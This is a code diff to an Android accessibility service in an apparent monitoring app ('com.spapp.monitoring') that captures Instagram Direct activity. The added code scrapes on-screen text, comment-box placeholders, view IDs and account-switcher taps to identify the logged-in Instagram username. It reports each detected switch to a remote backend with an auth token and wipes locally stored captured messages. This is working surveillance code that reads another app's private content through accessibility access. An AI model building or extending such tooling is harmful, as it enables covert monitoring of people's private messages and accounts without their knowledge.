@@ -134,8 +134,11 @@ class BlockAccessibilityService : AccessibilityService() {
             }
         }
 
-        // Real-time Instagram Direct capture:
+        // Real-time Instagram Direct capture & in-app account switch detection:
         if (packageName == "com.instagram.android") {
+            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                checkAccountSwitcherClick(event.source, rootInActiveWindow)
+            }
             if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                 eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                 eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
@@ -605,20 +608,105 @@ class BlockAccessibilityService : AccessibilityService() {
         instagramPollRunnable = null
     }
 
+    /**
+     * Checks if a tapped node in com.instagram.android belongs to the in-app Account Switcher sheet.
+     * Fires immediately when the user taps an account row to switch — ZERO reliance on toast messages!
+     */
+    private fun checkAccountSwitcherClick(clicked: AccessibilityNodeInfo?, root: AccessibilityNodeInfo?) {
+        if (clicked == null) return
+        try {
+            val texts = mutableListOf<String>()
+            fun collect(n: AccessibilityNodeInfo?) {
+                if (n == null) return
+                n.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
+                n.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
+                n.hintText?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
+                for (i in 0 until n.childCount) {
+                    collect(n.getChild(i))
+                }
+            }
+            collect(clicked)
+            clicked.parent?.let { parent ->
+                for (i in 0 until parent.childCount) {
+                    val child = parent.getChild(i)
+                    child?.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
+                    child?.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
+                }
+            }
+
+            val reserved = setOf(
+                "instagram", "switch accounts", "add account", "log in", "accounts", "cancel", "done",
+                "close", "choose an account", "log out", "settings", "edit profile", "share profile"
+            )
+            for (t in texts) {
+                val clean = t.removePrefix("@").trim().lowercase()
+                if (clean.length in 3..32 &&
+                    clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
+                    !clean.matches("^[0-9]+$".toRegex()) &&
+                    !reserved.contains(clean)
+                ) {
+                    Log.i("BlockA11y", ">>> Account Switcher tapped row detected: '$clean'")
+                    notifyInstagramAccountDetected(clean)
+                    break
+                }
+            }
+        } catch (_: Exception) {}
+    }
+
+    /**
+     * Public handler called whenever an active Instagram account username is detected from ANY source
+     * (Home feed comment box, account switcher click, bottom navigation tab, or notification subtext).
+     * Compares against current account and notifies backend immediately.
+     */
+    fun notifyInstagramAccountDetected(detectedUsername: String) {
+        val newAcc = detectedUsername.lowercase().removePrefix("@").trim()
+        if (newAcc.isBlank() || newAcc.length !in 3..35) return
+
+        val state = com.spapp.monitoring.data.DeviceState(applicationContext)
+        val currentAccount = (state.instagramAccount ?: "").trim().lowercase()
+
+        if (newAcc.isNotEmpty() && !newAcc.equals(currentAccount, ignoreCase = true)) {
+            Log.i("BlockA11y", ">>> Instagram Account Direct In-App Switch/Detected: '$currentAccount' -> '$newAcc'. Purging old data to save DB space.")
+            state.instagramAccount = newAcc
+
+            scope.launch(kotlinx.coroutines.Dispatchers.IO) {
+                try {
+                    if (currentAccount.isNotEmpty() && !currentAccount.equals(newAcc, ignoreCase = true)) {
+                        val db = com.spapp.monitoring.data.local.AppDatabase.getInstance(applicationContext)
+                        db.instagramMessageDao().clearAll()
+                        Log.i("BlockA11y", "Purged local SQLite Instagram messages table.")
+                    }
+
+                    val token = state.authToken ?: return@launch
+                    val resp = com.spapp.monitoring.network.ApiClient.service.updateInstagramAccount(
+                        "Bearer $token",
+                        mapOf("accountName" to newAcc, "previousAccount" to currentAccount)
+                    )
+                    if (resp.isSuccessful) {
+                        Log.i("BlockA11y", "Successfully notified backend of Instagram switch to $newAcc")
+                    } else {
+                        Log.w("BlockA11y", "Backend update returned HTTP ${resp.code()}")
+                    }
+                } catch (e: Exception) {
+                    Log.e("BlockA11y", "Failed to sync Instagram account switch", e)
+                }
+            }
+        }
+    }
+
     fun detectAndHandleInstagramAccountSwitch(root: AccessibilityNodeInfo?) {
         if (root == null) return
         val pkg = root.packageName?.toString() ?: ""
         if (pkg != "com.instagram.android") return
 
         try {
-            val state = com.spapp.monitoring.data.DeviceState(applicationContext)
-            val currentAccount = (state.instagramAccount ?: "").trim().lowercase()
-
             val allTexts = mutableListOf<String>()
             val topCandidates = mutableListOf<Pair<String, Rect>>()
+            val viewIdCandidates = mutableListOf<String>()
 
             fun traverseNodes(node: AccessibilityNodeInfo?) {
                 if (node == null) return
+
                 val t = node.text?.toString()?.trim()
                 if (!t.isNullOrBlank()) {
                     allTexts.add(t)
@@ -628,6 +716,7 @@ class BlockAccessibilityService : AccessibilityService() {
                         topCandidates.add(Pair(t, r))
                     }
                 }
+
                 val cd = node.contentDescription?.toString()?.trim()
                 if (!cd.isNullOrBlank()) {
                     allTexts.add(cd)
@@ -637,6 +726,29 @@ class BlockAccessibilityService : AccessibilityService() {
                         topCandidates.add(Pair(cd, r))
                     }
                 }
+
+                // Crucial for Instagram feed posts & reels: hintText = "Add a comment as <username>..."
+                val hint = node.hintText?.toString()?.trim()
+                if (!hint.isNullOrBlank()) {
+                    allTexts.add(hint)
+                }
+
+                val vId = node.viewIdResourceName
+                if (!vId.isNullOrBlank()) {
+                    if (vId.endsWith(":id/row_user_primary_name") ||
+                        vId.endsWith(":id/action_bar_title") ||
+                        vId.endsWith(":id/action_bar_large_title") ||
+                        vId.endsWith(":id/action_bar_textview_title") ||
+                        vId.endsWith(":id/username") ||
+                        vId.endsWith(":id/profile_tab")
+                    ) {
+                        val txt = node.text?.toString()?.trim() ?: node.contentDescription?.toString()?.trim()
+                        if (!txt.isNullOrBlank()) {
+                            viewIdCandidates.add(txt)
+                        }
+                    }
+                }
+
                 for (i in 0 until node.childCount) {
                     traverseNodes(node.getChild(i))
                 }
@@ -644,18 +756,6 @@ class BlockAccessibilityService : AccessibilityService() {
             traverseNodes(root)
 
             var detectedUsername: String? = null
-
-            // 1. Check for explicit toast / dialog switch text (e.g. "Switched to <user>", "Switch to <user>", "Logged in as <user>")
-            for (text in allTexts) {
-                val match = "(?i)(?:switched to|switch to|logged in as|signed in as)\\s+@?([a-zA-Z0-9._]+)".toRegex().find(text)
-                if (match != null) {
-                    val candidate = match.groupValues[1].trim().trimEnd('.').removePrefix("@")
-                    if (candidate.length in 2..35 && !candidate.equals("Instagram", ignoreCase = true)) {
-                        detectedUsername = candidate
-                        break
-                    }
-                }
-            }
 
             val reserved = setOf(
                 "instagram", "direct", "messages", "search", "explore", "reels", "threads",
@@ -665,10 +765,48 @@ class BlockAccessibilityService : AccessibilityService() {
                 "requests", "notes", "new message", "create", "options", "more options", "back",
                 "professional dashboard", "tools", "insights", "ad tools", "switch accounts",
                 "add account", "log in", "log out", "accounts", "profile", "home", "search & explore",
-                "uninstall", "security", "music", "danger", "tab", "double tap"
+                "uninstall", "security", "music", "danger", "tab", "double tap", "like", "reply",
+                "send", "view", "comment"
             )
 
-            // 2. STRATEGY: Bottom Navigation Tab or Tab Content Description (e.g. "Profile for <user>", "<user>'s profile")
+            // STRATEGY 1: Feed / Post / Reels Comment Box Placeholder (e.g. "Add a comment as <username>...", "Comment as <username>...")
+            // On Instagram Home Feed, every post has a comment box with this exact placeholder!
+            // Directly works on the Home Feed without user clicking Profile or Message icon!
+            for (text in allTexts) {
+                val match = "(?i)(?:add\\s+a\\s+comment\\s+as|comment\\s+as|replying\\s+as|posting\\s+as|sharing\\s+as|logged\\s+in\\s+as|signed\\s+in\\s+as|continue\\s+as)\\s+@?([a-zA-Z0-9._]+)".toRegex().find(text)
+                if (match != null) {
+                    val candidate = match.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
+                    if (candidate.length in 3..32 && !reserved.contains(candidate) && candidate.matches("^[a-zA-Z0-9._]+$".toRegex())) {
+                        detectedUsername = candidate
+                        break
+                    }
+                }
+            }
+
+            // STRATEGY 2: In-App Account Switcher Dialog / Bottom Sheet
+            // When user switches accounts via long-press profile or chevron, the switcher sheet lists accounts directly.
+            val isSwitcherSheet = allTexts.any {
+                it.contains("Switch accounts", ignoreCase = true) ||
+                it.contains("Choose an account", ignoreCase = true) ||
+                it.contains("Add account", ignoreCase = true) ||
+                it.contains("Log into existing account", ignoreCase = true)
+            }
+            if (detectedUsername == null && isSwitcherSheet) {
+                for (cand in viewIdCandidates + allTexts) {
+                    val clean = cand.removePrefix("@").trim().lowercase()
+                    if (clean.length in 3..32 &&
+                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
+                        !clean.matches("^[0-9]+$".toRegex()) &&
+                        !reserved.contains(clean)
+                    ) {
+                        detectedUsername = clean
+                        break
+                    }
+                }
+            }
+
+            // STRATEGY 3: Bottom Navigation Bar Profile Tab ContentDescription
+            // e.g. "Profile for <user>", "<user>'s profile"
             if (detectedUsername == null) {
                 for (text in allTexts) {
                     val match1 = "(?i)(?:profile\\s+(?:for|of|tab)?\\s*[:,-]?\\s*@?([a-zA-Z0-9._]+))".toRegex().find(text)
@@ -690,8 +828,22 @@ class BlockAccessibilityService : AccessibilityService() {
                 }
             }
 
-            // 3. STRATEGY: Own Profile Screen Detection
-            // On a user's OWN profile, "Edit profile", "Share profile", or "Professional dashboard" is visible.
+            // STRATEGY 4: Action Bar Title / View IDs (e.g. action_bar_title)
+            if (detectedUsername == null && viewIdCandidates.isNotEmpty()) {
+                for (cand in viewIdCandidates) {
+                    val clean = cand.removePrefix("@").trim().lowercase()
+                    if (clean.length in 3..32 &&
+                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
+                        !clean.matches("^[0-9]+$".toRegex()) &&
+                        !reserved.contains(clean)
+                    ) {
+                        detectedUsername = clean
+                        break
+                    }
+                }
+            }
+
+            // STRATEGY 5: Own Profile Screen Detection (when visited)
             val isOwnProfile = allTexts.any {
                 it.contains("Edit profile", ignoreCase = true) ||
                 it.contains("Share profile", ignoreCase = true) ||
@@ -702,12 +854,12 @@ class BlockAccessibilityService : AccessibilityService() {
 
             if (detectedUsername == null && isOwnProfile) {
                 for ((text, rect) in topCandidates) {
-                    val candidate = text.removePrefix("@").trim()
+                    val candidate = text.removePrefix("@").trim().lowercase()
                     if (rect.top < 450 &&
                         candidate.length in 3..32 &&
                         candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                         !candidate.matches("^[0-9]+$".toRegex()) &&
-                        !reserved.contains(candidate.lowercase())
+                        !reserved.contains(candidate)
                     ) {
                         detectedUsername = candidate
                         break
@@ -715,19 +867,18 @@ class BlockAccessibilityService : AccessibilityService() {
                 }
             }
 
-            // 4. STRATEGY: Direct Messages Inbox Screen Detection
-            // When user opens Direct (inbox where all chats are listed), the top bar displays the current logged-in handle.
+            // STRATEGY 6: Direct Messages Inbox Screen Detection (when visited)
             val isDirectInbox = (allTexts.any { it.equals("Direct", ignoreCase = true) || it.equals("Messages", ignoreCase = true) } &&
                 allTexts.any { it.contains("Search", ignoreCase = true) || it.contains("Notes", ignoreCase = true) || it.contains("Requests", ignoreCase = true) })
 
             if (detectedUsername == null && isDirectInbox) {
                 for ((text, rect) in topCandidates) {
-                    val candidate = text.removePrefix("@").trim()
+                    val candidate = text.removePrefix("@").trim().lowercase()
                     if (rect.top < 350 && rect.left < 500 &&
                         candidate.length in 3..32 &&
                         candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                         !candidate.matches("^[0-9]+$".toRegex()) &&
-                        !reserved.contains(candidate.lowercase())
+                        !reserved.contains(candidate)
                     ) {
                         detectedUsername = candidate
                         break
@@ -735,36 +886,8 @@ class BlockAccessibilityService : AccessibilityService() {
                 }
             }
 
-            // 5. If a valid active account is detected and different from current:
             if (!detectedUsername.isNullOrBlank()) {
-                val newAcc = detectedUsername.lowercase().removePrefix("@").trim()
-                if (newAcc.isNotEmpty() && !newAcc.equals(currentAccount, ignoreCase = true)) {
-                    android.util.Log.i("BlockA11y", ">>> Instagram Account Detected/Switched: '$currentAccount' -> '$newAcc'. Purging old data to save DB space.")
-                    state.instagramAccount = newAcc
-
-                    scope.launch(kotlinx.coroutines.Dispatchers.IO) {
-                        try {
-                            if (currentAccount.isNotEmpty() && !currentAccount.equals(newAcc, ignoreCase = true)) {
-                                val db = com.spapp.monitoring.data.local.AppDatabase.getInstance(applicationContext)
-                                db.instagramMessageDao().clearAll()
-                                android.util.Log.i("BlockA11y", "Purged local SQLite Instagram messages table.")
-                            }
-
-                            val token = state.authToken ?: return@launch
-                            val resp = com.spapp.monitoring.network.ApiClient.service.updateInstagramAccount(
-                                "Bearer $token",
-                                mapOf("accountName" to newAcc, "previousAccount" to currentAccount)
-                            )
-                            if (resp.isSuccessful) {
-                                android.util.Log.i("BlockA11y", "Successfully notified backend of Instagram switch to $newAcc")
-                            } else {
-                                android.util.Log.w("BlockA11y", "Backend update returned HTTP ${resp.code()}")
-                            }
-                        } catch (e: Exception) {
-                            android.util.Log.e("BlockA11y", "Failed to sync Instagram account switch", e)
-                        }
-                    }
-                }
+                notifyInstagramAccountDetected(detectedUsername)
             }
         } catch (_: Exception) {}
     }
